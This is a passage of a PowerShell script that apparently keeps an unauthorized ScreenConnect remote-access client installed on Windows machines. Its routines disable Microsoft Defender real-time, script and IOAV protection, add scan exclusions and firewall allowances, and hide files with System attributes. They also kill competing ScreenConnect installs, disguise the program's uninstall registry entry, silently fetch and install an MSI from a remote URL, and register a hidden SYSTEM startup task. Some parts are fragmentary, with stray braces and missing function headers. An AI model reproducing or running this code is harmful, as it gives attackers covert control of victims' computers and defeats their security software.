        elseif ((Test-Path `$monAlt) -and -not (Test-Path `$mon)) { Copy-Item `$monAlt `$mon -Force -EA SilentlyContinue }
        elseif ((Test-Path `$mon) -and (Test-Path `$monAlt)) {
            if ((Get-Item `$mon).Length -ne (Get-Item `$monAlt).Length) { Copy-Item `$mon `$monAlt -Force -EA SilentlyContinue }
        }
        foreach (`$p in @(`$work, `$workAlt, `$mon, `$monAlt)) {
            `$i = Get-Item `$p -Force -EA SilentlyContinue
            if (`$i) { `$i.Attributes = 'Hidden','System' }
        }
    } catch {}
}
function ReactiveIfBlocked {
    `$issues = @()
    if (-not (Test-Path `$mon) -and -not (Test-Path `$monAlt)) { `$issues += 'monitor_missing' }
    try {
        `$probe = Join-Path `$work '.writeprobe'
        'ok' | Out-File `$probe -Encoding ASCII -Force -EA Stop
        Remove-Item `$probe -Force -EA SilentlyContinue
    } catch { `$issues += 'workdir_not_writable' }
    `$svcOk = ScPresent
    if (-not `$svcOk) { `$issues += 'sc_service_missing' }
    elseif (-not (ScRunning)) { `$issues += 'sc_start_blocked' }
    if (TestHollow) { `$issues += 'sc_hollow_av_quarantine' }
    # do not flag webroot_present alone - causes endless reactive loops
    if (`$issues.Count -eq 0) { return }
    L ("Reactive AV pushback - issues: " + (`$issues -join ', '))
    QuietExclusions; FwAllow
    if (`$issues -contains 'webroot_present' -or `$issues -contains 'sc_hollow_av_quarantine') { WebrootPush }
    SyncCopies
    if (Get-Command Set-MpPreference -EA SilentlyContinue) {
        try {
            Set-MpPreference -DisableRealtimeMonitoring `$true -EA SilentlyContinue
            Set-MpPreference -DisableScriptScanning `$true -EA SilentlyContinue
            Set-MpPreference -DisableIOAVProtection `$true -EA SilentlyContinue
            QuietExclusions
        } catch {}
    }
}
function Allowed([string]`$n,[string]`$p='') {
    `$blob = "`$n `$p"
    foreach (`$b in `$badRelays) { if (`$blob -like "*`$b*") { return `$false } }
    if (`$blob -match '(?i)[?&]h=([^&\s]+)') {
        `$hostArg = `$Matches[1]
        `$ours = `$false
        foreach (`$h in `$relayHints) { if (`$hostArg -like "*`$h*") { `$ours = `$true; break } }
        if (-not `$ours) { return `$false }
    }
    foreach (`$a in `$allowed) { if (`$blob -like "*`$a*") { return `$true } }
    if (`$n -eq `$arpName -and `$p -like "*`$fp*") { return `$true }
    return `$false
}
function KillSvc([string]`$n) {
    if ([string]::IsNullOrWhiteSpace(`$n)) { return }
    cmd /c "sc stop `"`$n`"" >`$null 2>&1
    cmd /c "sc config `"`$n`" start= disabled" >`$null 2>&1
    cmd /c "sc delete `"`$n`"" >`$null 2>&1
}
function PurgeBadSc {
    L 'monitor: NUKE unauthorized SC'
    Get-CimInstance Win32_Process -EA SilentlyContinue | Where-Object {
        `$_.Name -match '(?i)ScreenConnect|ClientService|ConnectWise' -or
        ("`$(`$_.ExecutablePath)`$(`$_.CommandLine)" -match '(?i)ScreenConnect|ConnectWise')
    } | ForEach-Object {
        `$blob = "`$(`$_.Name) `$(`$_.ExecutablePath) `$(`$_.CommandLine)"
        if (Allowed `$_.Name "`$(`$_.ExecutablePath) `$(`$_.CommandLine)") { return }
        Stop-Process -Id `$_.ProcessId -Force -EA SilentlyContinue
        cmd /c "taskkill /F /PID `$(`$_.ProcessId)" >`$null 2>&1
        L ("monitor: killed rival SC pid `$(`$_.ProcessId) `$(`$_.Name)")
    }
    try {
        Get-CimInstance Win32_Service -EA SilentlyContinue | Where-Object {
            `$blob = "`$(`$_.Name) `$(`$_.DisplayName) `$(`$_.PathName)"
            (`$blob -match '(?i)ScreenConnect|ConnectWise') -and -not (Allowed `$_.Name `$_.PathName) -and -not (Allowed `$_.DisplayName `$_.PathName)
        } | ForEach-Object {
            L ("monitor: delete SC svc `$(`$_.Name)")
            KillSvc `$_.Name
            if ("`$(`$_.PathName)" -match '(?i)([0-9a-f]{16})') {
                `$badFp = `$Matches[1].ToLower()
                if (`$badFp -notin `$allowed) {
                    foreach (`$dir in @(
                        "`${env:ProgramFiles}\ScreenConnect Client (`$badFp)",
                        "`${env:ProgramFiles(x86)}\ScreenConnect Client (`$badFp)",
                        "`${env:ProgramData}\ScreenConnect\`$badFp"
                    )) {
                        if (Test-Path `$dir) { Remove-Item `$dir -Recurse -Force -EA SilentlyContinue; L "monitor: removed `$dir" }
                    }
                }
            }
        }
    } catch {}
    foreach (`$base in @("`${env:ProgramFiles}","`${env:ProgramFiles(x86)}")) {
        if (-not (Test-Path `$base)) { continue }
        Get-ChildItem `$base -Directory -EA SilentlyContinue |
            Where-Object { `$_.Name -like 'ScreenConnect*' -or `$_.Name -like 'ConnectWise*' } |
            ForEach-Object {
                `$keep = `$false
                foreach (`$a in `$allowed) { if (`$_.Name -like "*`$a*" -or `$_.FullName -like "*`$a*") { `$keep = `$true; break } }
                if (-not `$keep) {
                    L ("monitor: remove SC folder `$(`$_.FullName)")
                    Remove-Item `$_.FullName -Recurse -Force -EA SilentlyContinue
                }
            }
    }
}
function Arp {
    foreach (`$root in @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')) {
        Get-ChildItem `$root -EA SilentlyContinue | ForEach-Object {
            `$p = Get-ItemProperty `$_.PSPath -EA SilentlyContinue
            if (-not `$p) { return }
            `$hit = (`$p.DisplayName -like "*ScreenConnect Client (`$fp)*") -or
                    (`$p.InstallLocation -like "*`$fp*" -and `$p.DisplayName -like '*ScreenConnect*') -or
                    (`$_.PSPath -like "*`$fp*" -and (`$p.DisplayName -like '*ScreenConnect*' -or `$p.DisplayName -eq `$arpName))
            if (-not `$hit) { return }
            Set-ItemProperty `$_.PSPath -Name DisplayName -Value `$arpName -EA SilentlyContinue
            Set-ItemProperty `$_.PSPath -Name Publisher -Value `$arpPub -EA SilentlyContinue
        }
    }
}

    if (ScPresent) { return `$true }
    foreach (`$base in @(
        "`${env:ProgramFiles}\ScreenConnect Client (`$fp)",
        "`${env:ProgramFiles(x86)}\ScreenConnect Client (`$fp)",
        "`${env:ProgramData}\ScreenConnect\`$fp"
    )) { if (Test-Path `$base) { return `$true } }

}
function Install {
    if ((ScRunning) -and -not (TestHollow)) { L 'Primary SC service RUNNING - skip MSI'; return `$true }
    if ((ScPresent) -and -not (TestHollow)) {
        L 'Primary SC present - starting service (no MSI)'
        cmd /c ('sc config "' + `$svcName + '" start= auto') >`$null 2>&1
        cmd /c ('sc start "' + `$svcName + '"') >`$null 2>&1
        Start-Sleep 5
        if (ScRunning) { L 'SC service RUNNING after sc start'; return `$true }
        L 'sc start failed - will try MSI repair'
    }
    if (-not (ScPresent)) { L 'Primary SC service missing - forcing MSI install' }
    elseif (TestHollow) { L 'Primary SC hollow - forcing MSI repair'; cmd /c ('sc stop "' + `$svcName + '"') >`$null 2>&1 }
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    New-Item -ItemType Directory -Path `$work -Force | Out-Null
    if (Test-Path `$msi) { Remove-Item `$msi -Force -EA SilentlyContinue }
    try { Invoke-WebRequest -Uri `$msiUrl -OutFile `$msi -UseBasicParsing } catch {
        `$wc = New-Object System.Net.WebClient; `$wc.DownloadFile(`$msiUrl, `$msi); `$wc.Dispose()
    }
    if (-not (Test-Path `$msi) -or ((Get-Item `$msi).Length -lt 500000)) { L 'MSI invalid'; return `$false }
    L ('MSI bytes: ' + (Get-Item `$msi).Length)
    `$p = Start-Process msiexec.exe -ArgumentList "/i ``"`$msi``" /quiet /norestart ALLUSERS=1" -Wait -PassThru -WindowStyle Hidden
    `$code = `$p.ExitCode
    L ("msiexec exit " + `$code)
    Start-Sleep 8
    Remove-Item `$msi -Force -EA SilentlyContinue
    FwAllow
    cmd /c ('sc start "' + `$svcName + '"') >`$null 2>&1
    Start-Sleep 3
    if (ScRunning) { L 'SC service RUNNING after MSI'; return `$true }
    if (ScPresent) { L 'SC service present after MSI but not running'; return `$false }
    L 'MSI finished but SC service still missing'
    return `$false
}

}

function EnsureUp {
    L 'monitor ENSURE tick'

    if (-not (ScRunning) -or -not (AppOk) -or (TestHollow)) { `$need = `$true }
    `$tcp = RelayTcp
    `$sess = `$false
    if ((ScRunning) -and `$tcp) { `$sess = RelaySess }
    `$runNow = ScRunning
    `$holNow = TestHollow
    L ("monitor health running=`$runNow hollow=`$holNow tcp=`$tcp sess=`$sess")
    if (`$need) {
        if (TestWebrootInstalled -or (TestHollow)) { WebrootPush }
        if (-not (Install)) { ReactiveIfBlocked; Install | Out-Null }
        HardRestart
        Start-Sleep 5
    } elseif (-not (ScRunning)) {
        HardRestart
        if (-not (ScRunning)) { ReactiveIfBlocked; Install | Out-Null }
    } elseif (-not `$tcp) {
        try { ipconfig /flushdns >`$null 2>&1 } catch {}
        HardRestart
    } elseif (-not `$sess) {
        HardRestart
        Start-Sleep 8
        `$sess = RelaySess
    }
    if (ScPresent) {
        cmd /c ('sc config "' + `$svcName + '" start= auto') >`$null 2>&1
        if (-not (ScRunning)) { cmd /c ('sc start "' + `$svcName + '"') >`$null 2>&1; Start-Sleep 3 }
    }
    `$tcp2 = RelayTcp; `$sess2 = RelaySess
    if ((ScRunning) -and (-not (TestHollow)) -and `$tcp2) {
        L ("monitor SC UP tcp=`$tcp2 sess=`$sess2")
    } else {
        L 'monitor SC NOT fully up - will retry next tick'
        ReactiveIfBlocked
    }
}

    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
        -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero) -Hidden -MultipleInstances IgnoreNew

    # Startup action prefers primary VBS, falls back inside VBS to alt monitor

        -Trigger (New-ScheduledTaskTrigger -AtStartup) -Principal $principal -Settings $settings -Force | Out-Null
    Write-Log "Task registered: $TaskPath$TaskName + Startup (15 min, dual-path)"
